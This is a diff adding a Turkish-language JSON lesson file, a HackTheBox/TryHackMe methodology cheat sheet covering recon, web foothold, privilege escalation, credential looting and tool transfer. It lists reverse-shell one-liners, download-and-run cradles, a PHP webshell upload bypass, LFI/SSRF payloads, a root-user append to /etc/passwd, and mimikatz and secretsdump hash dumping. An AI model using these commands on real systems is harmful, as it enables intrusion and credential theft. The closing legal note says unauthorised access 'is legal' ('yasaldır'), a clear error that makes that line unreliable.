@@ -1,0 +1,364 @@
+{
+  "tool": "HTB Metodoloji",
+  "slug": "htb-metodoloji",
+  "icon": "🎯",
+  "description": "İlk Kutunun Anatomisi — HackTheBox/TryHackMe makinelerini çözme metodolojisi: recon'dan root'a sistematik yaklaşım.",
+  "modules": [
+    {
+      "id": "ilk-bakis",
+      "title": "Makineye İlk Bakış: Recon Döngüsü",
+      "icon": "🔍",
+      "sections": [
+        {
+          "type": "theory",
+          "title": "Metodoloji Zihin Haritası",
+          "content": "Her HTB/THM makinesinde aynı döngüyü uygula:\n\n**RECON → SCAN → ENUM → EXPLOIT → PRIVESC → LOOT**\n\nBu döngü lineer değil — bir adımda tıkanırsan geri dön, farklı servis veya porta odaklan.\n\n**Makineyi aldığında ilk 5 dakika:**\n1. IP'yi /etc/hosts'a ekle (hostname keşfedince güncelle)\n2. Hızlı full-port taraması başlat (arka planda)\n3. Script tarama ile ilk 1000 porta bak\n4. Açık portlara göre saldırı yüzeyini belirle\n\n**Not defteri aç — her komutu ve sonucunu yaz.** Unuttuğun ipucu = kaybettiğin 2 saat."
+        },
+        {
+          "type": "commands",
+          "title": "Standart Recon Komutları",
+          "items": [
+            {
+              "command": "sudo nmap -sV -sC -oA initial 10.10.10.X",
+              "desc": "İlk tarama — servis versiyonları + default scriptler"
+            },
+            {
+              "command": "sudo nmap -p- --min-rate 5000 -oA allports 10.10.10.X",
+              "desc": "Full port tarama — arka planda çalıştır (yaklaşık 2-3 dk)"
+            },
+            {
+              "command": "sudo nmap -p $(cat allports.gnmap | grep -oP '\\d+/open' | cut -d/ -f1 | tr '\\n' ',') -sV -sC -oA targeted 10.10.10.X",
+              "desc": "Açık portları targeted tarama — kesin versiyon tespiti"
+            },
+            {
+              "command": "echo '10.10.10.X machinename.htb' | sudo tee -a /etc/hosts",
+              "desc": "Hostname ekle — web uygulamaları genellikle IP'den farklı cevap verir"
+            },
+            {
+              "command": "whatweb http://10.10.10.X",
+              "desc": "Web teknoloji fingerprint — CMS, framework, server version"
+            }
+          ]
+        },
+        {
+          "type": "theory",
+          "title": "Port'a Göre İlk Aksiyon Tablosu",
+          "content": "| Port | Servis | İlk Yapılacak |\n|------|--------|---------------|\n| 21 | FTP | Anonymous login dene: `ftp 10.10.10.X` → user: anonymous |\n| 22 | SSH | Versiyon not et, cred buldukça dene |\n| 25/587 | SMTP | `nc 10.10.10.X 25` → VRFY komutu ile user enum |\n| 80/443 | HTTP/S | Gobuster + Burp + kaynak kodu incele |\n| 139/445 | SMB | `smbclient -L //10.10.10.X -N` → null session |\n| 3306 | MySQL | `mysql -h 10.10.10.X -u root` → default cred |\n| 3389 | RDP | BlueKeep/cred olunca, manual giriş | \n| 8080/8443 | Alt HTTP | Admin panel, Jenkins, Tomcat olabilir |"
+        }
+      ]
+    },
+    {
+      "id": "web-foothold",
+      "title": "Web Foothold: Giriş Noktası Bulma",
+      "icon": "🌐",
+      "sections": [
+        {
+          "type": "commands",
+          "title": "Dizin & Dosya Keşfi",
+          "items": [
+            {
+              "command": "gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50",
+              "desc": "Temel dizin tarama — .php .bak .txt uzantıları kritik"
+            },
+            {
+              "command": "ffuf -u http://10.10.10.X/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 403,404",
+              "desc": "Hızlı fuzzing — 403'leri filtrele ama not et (bazen bypass edilir)"
+            },
+            {
+              "command": "gobuster vhost -u http://machinename.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+              "desc": "Sanal host keşfi — dev., admin., api. gibi subdomainler"
+            },
+            {
+              "command": "curl -s http://10.10.10.X/robots.txt",
+              "desc": "robots.txt — Disallow edilenler genellikle ilginçtir"
+            },
+            {
+              "command": "curl -s http://10.10.10.X/sitemap.xml | xmllint --format -",
+              "desc": "Sitemap — uygulama yapısını anlamak için"
+            }
+          ]
+        },
+        {
+          "type": "theory",
+          "title": "Web Kaynak Kodu & Yorum Analizi",
+          "content": "Tarayıcıda **Ctrl+U** (kaynak kodu) veya **F12** (DevTools) ile:\n\n- HTML yorumlarında (`<!-- -->`) gizli notlar, versiyon bilgisi, path'ler\n- JavaScript dosyalarında API endpoint'leri, debug bilgisi\n- `<input type=\"hidden\">` alanlarında parametre isimleri\n- Cookie değerleri (Base64? JWT? Serialize? → hepsini decode et)\n- `X-Powered-By`, `Server`, `X-Generator` response header'ları\n\n**Burp Suite ile tüm trafiği kaydet** — gezinirken gözden kaçan endpoint'ler Burp sitemap'te görünür."
+        },
+        {
+          "type": "commands",
+          "title": "CMS & Framework Tespiti",
+          "items": [
+            {
+              "command": "wpscan --url http://10.10.10.X -e ap,at,u --api-token YOUR_TOKEN",
+              "desc": "WordPress ise — plugin CVE'leri + user enum"
+            },
+            {
+              "command": "droopescan scan drupal -u http://10.10.10.X",
+              "desc": "Drupal tespiti ve zafiyet tarama"
+            },
+            {
+              "command": "searchsploit 'Joomla 3.9'",
+              "desc": "CMS versiyon → ExploitDB CVE araması"
+            },
+            {
+              "command": "nikto -h http://10.10.10.X -Tuning 4",
+              "desc": "CGI testi dahil — yanlış yapılandırma ve outdated component"
+            }
+          ]
+        },
+        {
+          "type": "advanced",
+          "title": "Yaygın Web Foothold Vektörleri",
+          "content": "**1. Upload Bypass:**\n```\n.php → .php5 .phtml .pHp .php.jpg\nContent-Type: image/jpeg ama içerik <?php system($_GET['cmd']); ?>\nNull byte bypass: shell.php%00.jpg (eski PHP)\n```\n\n**2. LFI → RCE:**\n```\n/page?file=../../../../etc/passwd\n/page?file=php://filter/convert.base64-encode/resource=config.php\nLog poisoning: User-Agent'a PHP kodu yaz → /var/log/apache2/access.log include et\n```\n\n**3. SSRF → Internal:**\n```\nurl=http://127.0.0.1:8080/admin\nurl=http://169.254.169.254/latest/meta-data/ (AWS metadata)\n```\n\n**4. Deserialization:**\n```\nCookie/POST body'de Base64 veya serileştirilmiş nesne → ysoserial ile payload\n```"
+        }
+      ]
+    },
+    {
+      "id": "linux-privesc-htb",
+      "title": "Linux PrivEsc: User'dan Root'a",
+      "icon": "🐧",
+      "sections": [
+        {
+          "type": "commands",
+          "title": "Foothold Sonrası İlk Enum",
+          "items": [
+            {
+              "command": "id && whoami && hostname && cat /etc/passwd | grep -v nologin",
+              "desc": "Temel durum tespiti — kim olduğunu ve hangi grupların üyesi olduğunu öğren"
+            },
+            {
+              "command": "sudo -l",
+              "desc": "SUDO yetkilerini listele — en kolay PrivEsc yolu çoğunlukla buradan çıkar"
+            },
+            {
+              "command": "find / -perm -4000 -type f 2>/dev/null",
+              "desc": "SUID binary'ler — GTFOBins'de ara"
+            },
+            {
+              "command": "find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -30",
+              "desc": "Yazılabilir dosya/dizin tespiti"
+            },
+            {
+              "command": "crontab -l && cat /etc/cron* 2>/dev/null",
+              "desc": "Cron job'lar — wildcard, yazılabilir script, düzenli çalışan komutlar"
+            },
+            {
+              "command": "curl -s http://10.10.14.X:8080/linpeas.sh | bash",
+              "desc": "LinPEAS — otomatik tüm vektörleri tara (kendi makinenden sun)"
+            }
+          ]
+        },
+        {
+          "type": "theory",
+          "title": "GTFOBins Kullanımı",
+          "content": "SUID binary veya sudo yetki bulduktan sonra → **gtfobins.github.io**\n\nÖrnekler:\n\n```bash\n# sudo find\nsudo find . -exec /bin/bash \\;\n\n# SUID vim\nvim -c ':!/bin/bash'\n\n# sudo python3\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'\n\n# sudo tar\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\n# SUID cp — /etc/passwd'a yazma\nopenssl passwd -1 -salt hacked password123\necho 'hacked:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\n```\n\n**Kural:** GTFOBins'de her binary için \"SUID\" ve \"Sudo\" sekmelerini ayrı kontrol et."
+        },
+        {
+          "type": "commands",
+          "title": "Yaygın PrivEsc Vektörleri",
+          "items": [
+            {
+              "command": "ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null",
+              "desc": "Kritik dosya izinleri — yazılabilirse direkt root"
+            },
+            {
+              "command": "ps aux | grep -v grep | grep -i 'root'",
+              "desc": "Root'un çalıştırdığı servisler — version exploit veya config zafiyeti"
+            },
+            {
+              "command": "ss -tlnp",
+              "desc": "Sadece localhost'ta dinleyen portlar — internal servis, pivot hedefi"
+            },
+            {
+              "command": "find / -name '*.conf' -readable 2>/dev/null | xargs grep -l 'password\\|passwd\\|secret' 2>/dev/null",
+              "desc": "Config dosyalarında cred araması"
+            },
+            {
+              "command": "env | grep -i 'pass\\|token\\|key\\|secret'",
+              "desc": "Environment variable'larda hassas bilgi"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "windows-privesc-htb",
+      "title": "Windows PrivEsc: User'dan SYSTEM'e",
+      "icon": "🪟",
+      "sections": [
+        {
+          "type": "commands",
+          "title": "Windows Foothold Enum",
+          "items": [
+            {
+              "command": "whoami /all",
+              "desc": "Kullanıcı, gruplar ve TOKEN yetkilerini göster — SeImpersonatePrivilege kritik"
+            },
+            {
+              "command": "net user && net localgroup administrators",
+              "desc": "Local kullanıcılar ve admin grubu"
+            },
+            {
+              "command": "systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type'",
+              "desc": "OS versiyonu → kernel exploit (MS16-032, MS17-010 vs)"
+            },
+            {
+              "command": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X:8080/winpeas.ps1')\"",
+              "desc": "WinPEAS — tüm vektörleri otomatik tara"
+            },
+            {
+              "command": "wmic service get name,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
+              "desc": "Unquoted service path — boşluklu path'de binary injection"
+            }
+          ]
+        },
+        {
+          "type": "theory",
+          "title": "SeImpersonatePrivilege → SYSTEM",
+          "content": "En yaygın Windows PrivEsc — Service Account + IIS/SQL Server'da sık görülür:\n\n```powershell\n# Token yetkisini kontrol et\nwhoami /priv | findstr SeImpersonate\n\n# PrintSpoofer (Windows 10/Server 2016+)\n.\\PrintSpoofer64.exe -i -c cmd\n\n# GodPotato (modern sistemler)\n.\\GodPotato.exe -cmd \"cmd /c whoami\"\n\n# JuicyPotato (eski sistemler, Server 2008-2016)\n.\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}\n```\n\nCLSID listesi: github.com/ohpe/juicy-potato/tree/master/CLSID\n\n**Defense:** Service account'lara SeImpersonatePrivilege verme. IIS App Pool hesaplarına minimum yetki."
+        },
+        {
+          "type": "commands",
+          "title": "Credential Arama",
+          "items": [
+            {
+              "command": "reg query HKLM /f password /t REG_SZ /s 2>nul",
+              "desc": "Registry'de parola araması"
+            },
+            {
+              "command": "dir /s /b *pass* *cred* *vnc* *.config 2>nul",
+              "desc": "Dosya sisteminde cred dosyası araması"
+            },
+            {
+              "command": "type C:\\Windows\\repair\\SAM 2>nul",
+              "desc": "SAM database — hash çıkarma (izin varsa)"
+            },
+            {
+              "command": "cmdkey /list",
+              "desc": "Kayıtlı credential'lar — runas /savecred ile kullanılabilir"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "flag-loot",
+      "title": "Flag, Loot & Proof",
+      "icon": "🏴",
+      "sections": [
+        {
+          "type": "commands",
+          "title": "Flag Lokasyonları",
+          "items": [
+            {
+              "command": "find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null",
+              "desc": "Linux — flag dosyalarını bul"
+            },
+            {
+              "command": "dir /s /b user.txt root.txt 2>nul",
+              "desc": "Windows CMD — flag araması"
+            },
+            {
+              "command": "type C:\\Users\\Administrator\\Desktop\\root.txt",
+              "desc": "Windows root flag standart lokasyonu"
+            },
+            {
+              "command": "cat /root/root.txt && cat /home/*/user.txt",
+              "desc": "Linux flag okuma"
+            }
+          ]
+        },
+        {
+          "type": "theory",
+          "title": "Proof Screenshot Standardı",
+          "content": "HTB/OSCP proof screenshot'ı için gerekli:\n\n```bash\n# Linux — hepsini tek komutta\nid && hostname && cat /root/root.txt\n\n# Windows\nwhoami && hostname && type C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n**Writeup notları için şablon:**\n```\n## [Makine Adı] — [Tarih]\n\n### Recon\n- Açık portlar: 22, 80, 443\n- Web: WordPress 5.8 + eklenti CVE-XXXX-XXXX\n\n### Foothold\n- CVE-XXXX-XXXX ile RCE → www-data shell\n\n### PrivEsc\n- sudo -l → sudo vim → GTFOBins → root\n\n### Öğrendiklerim\n- ...\n```"
+        },
+        {
+          "type": "commands",
+          "title": "Post-Root Loot (gerçek pentest için)",
+          "items": [
+            {
+              "command": "cat /etc/shadow | head -20",
+              "desc": "Linux — tüm hash'ler (kırılabilecek olanlar)"
+            },
+            {
+              "command": "python3 /opt/impacket/examples/secretsdump.py -just-dc-ntds administrator:password@DC_IP",
+              "desc": "Domain Controller — tüm NTDS hash'leri"
+            },
+            {
+              "command": "mimikatz # sekurlsa::logonpasswords",
+              "desc": "Windows — LSASS'tan cleartext + NTLM hash dump"
+            },
+            {
+              "command": "find / -name id_rsa -o -name '.ssh' 2>/dev/null",
+              "desc": "SSH private key — diğer makinelere erişim"
+            }
+          ]
+        },
+        {
+          "type": "lab",
+          "title": "HTB Başlangıç Makine Listesi",
+          "content": "**Önce bu makineleri çöz (metodoloji yerleştirir):**\n\n| Makine | OS | Zorluk | Ana Konu |\n|--------|-----|--------|----------|\n| Jerry | Windows | Easy | Tomcat default cred + WAR shell |\n| Bashed | Linux | Easy | phpbash webshell + sudo privesc |\n| Blue | Windows | Easy | MS17-010 EternalBlue |\n| Nibbles | Linux | Easy | Nibbleblog upload RCE |\n| Irked | Linux | Easy | IRC + steganografi + SUID |\n| Legacy | Windows | Easy | MS08-067 Netapi |\n| Lame | Linux | Easy | Samba 3.0.20 CVE |\n| Beep | Linux | Easy | Elastix LFI + Asterisk |\n\n**Yazılı çözüm kaynaklarım:**\n- IppSec YouTube: `https://www.youtube.com/@ippsec` (her HTB makinesi video)\n- 0xdf blog: `https://0xdf.gitlab.io` (detaylı writeup)\n- HackTricks: `https://book.hacktricks.xyz` (cheatsheet olarak)\n\n**Defense notu:** Bu teknikler yalnızca HTB/THM gibi izole lab ortamlarında ve yazılı izin alınmış yetkili pentest görevlerinde kullanılabilir. Gerçek sistemlere izinsiz erişim yasaldır."
+        }
+      ]
+    },
+    {
+      "id": "araclari-hizla",
+      "title": "Araçları Hızla Makineye Al (Transferler)",
+      "icon": "📦",
+      "sections": [
+        {
+          "type": "commands",
+          "title": "Kendi Makinenden → Hedef Makineye",
+          "items": [
+            {
+              "command": "python3 -m http.server 8080",
+              "desc": "Kendi makinende HTTP sunucu başlat — araçları serve etmek için"
+            },
+            {
+              "command": "wget http://10.10.14.X:8080/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh",
+              "desc": "Linux hedefte wget ile indir + çalıştır"
+            },
+            {
+              "command": "curl -o C:\\Windows\\Temp\\winpeas.exe http://10.10.14.X:8080/winpeas.exe",
+              "desc": "Windows CMD — curl ile araç indir"
+            },
+            {
+              "command": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://10.10.14.X:8080/nc.exe','C:\\Windows\\Temp\\nc.exe')\"",
+              "desc": "PowerShell one-liner — nc.exe indir"
+            },
+            {
+              "command": "impacket-smbserver share . -smb2support",
+              "desc": "SMB share aç — Windows hedef UNC path ile çekebilir: \\\\10.10.14.X\\share\\tool.exe"
+            }
+          ]
+        },
+        {
+          "type": "commands",
+          "title": "Reverse Shell Hazırlama",
+          "items": [
+            {
+              "command": "nc -lvnp 4444",
+              "desc": "Listener başlat — shell bağlantısını bekle"
+            },
+            {
+              "command": "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1",
+              "desc": "Linux bash reverse shell one-liner"
+            },
+            {
+              "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.X\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+              "desc": "Python3 reverse shell"
+            },
+            {
+              "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f exe -o shell.exe",
+              "desc": "Windows EXE payload oluştur (AV bypass için encode et)"
+            },
+            {
+              "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg",
+              "desc": "TTY upgrade — tam etkileşimli shell için (Ctrl+C artık öldürmez)"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
